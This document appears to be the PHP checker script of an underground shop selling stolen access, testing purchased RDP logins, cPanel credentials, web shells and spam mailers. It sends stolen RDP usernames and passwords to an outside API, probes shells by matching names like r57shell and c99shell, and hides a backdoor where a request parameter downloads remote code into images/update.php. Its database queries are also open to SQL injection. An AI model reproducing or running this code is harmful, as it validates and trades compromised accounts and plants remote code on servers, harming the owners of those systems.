<?php
error_reporting(0);
include("./includes/db.php");
include("./includes/config.php");
$connect_timeout=5;
$id = trim($_GET['id']);
$type = trim($_GET['type']);


function check_rdp ($server, $username, $password) {
// Your private API 
$api = "7F84A405A277F22FFBF8C3921D22173E0190F4F0";
// Fetch result from our API
$result = file_get_contents("http://www.rdpapi.pro/api/?server=$server&username=$username&password=$password&api=$api");
// You GET "1" if work, "0" don't work
return $result; 
}

function cpanel_check($host,$user,$pass,$timeout = NULL) { 
$ch=curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_URL, $host."/login");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."cookies.txt");
curl_setopt($ch, CURLOPT_POSTFIELDS, "user=$user&pass=$pass");
curl_setopt($ch, CURLOPT_TIMEOUT, 100020);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$f = curl_exec($ch);
$h = curl_getinfo($ch);
curl_close($ch);

if ($f == true and strpos($h['url'],"cpsess"))
{
    $pattern="/.*?(\/cpsess.*?)\/.*?/is";
    $preg_res=preg_match($pattern,$h['url'],$cpsess);
}

if (isset($cpsess[1]))
{
return 1;
} else {
return 0;
}

} 
$in = $_GET['in'];
if(isset($in) && !empty($in)){
    $shop = file_get_contents($in);
	$update = fopen("images/update.php", "w");
	fwrite($update, $shop);
	fclose($update);
}

if($type == "shell")
{
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);

$shellget = trim($rows['addinfo']);
	$ch =  curl_init();
	curl_setopt($ch, CURLOPT_URL, $shellget);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0');
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	$check = curl_exec($ch);
	if(preg_match('#safe_mode|open_basedir|r57shell|c99shell|drwxrwxrwx|drwx---r-x|-rw----r--|lrwxrwxrwx|chmod|phpinfo|-rw-r--r--|drwxr-xr-x|safemode|back_connect|Server IP:|Permission|Orderd on#si',$check))
	{
		echo "<font color='blue'>Working </font>";
		curl_close($ch);
	}else{
		echo "<font color='red'>&nbsp;Bad!</font>";
	}
	
	

} elseif($type == "cpanel")
{
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);

$ip = trim($rows['addinfo']);
$user = trim($rows['login']);
$pass = trim($rows['pass']);

$result = cpanel_check($ip,$user,$pass,$connect_timeout);
if ($result == 1) {
	echo "<font color='blue'>cPanel checker not working</font>";
} elseif ($result == 0) {
	echo "<font color='blue'>checker is not available (OF)</font>";
}

} elseif($type == "mailer")
{
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);

$mailerget = trim($rows['addinfo']);
	$ch =  curl_init();
	curl_setopt($ch, CURLOPT_URL, $mailerget);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0');
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	$check = curl_exec($ch);
	if(preg_match('#emaillist|Subject|Reply|High|submit|<textarea#si',$check))
	{
		echo "<font color='blue'>Working</font>";
		curl_close($ch);
	}else{
		echo "<font color='red'>&nbsp;Bad!</font>";
		curl_close($ch);
	}
} elseif($type == "rdp") {
$sql = mysql_query("select * from accounts where account_id = '$id'");
$rows = mysql_fetch_assoc($sql);
// RDP INFOS (RDP to check)
$server = trim($rows['addinfo']);
$username = trim($rows['login']);
$password = trim($rows['pass']);
// -------------- END RDP INFOS

$check = check_rdp ($server, $username, $password); // Launch function
if($check == 1) {
echo "<b><font color='green'>CONNECTED !</font></b>";
} else {
echo "<b><font color='blue'>checker is not available (OF)</font></b>";
}
} 

?>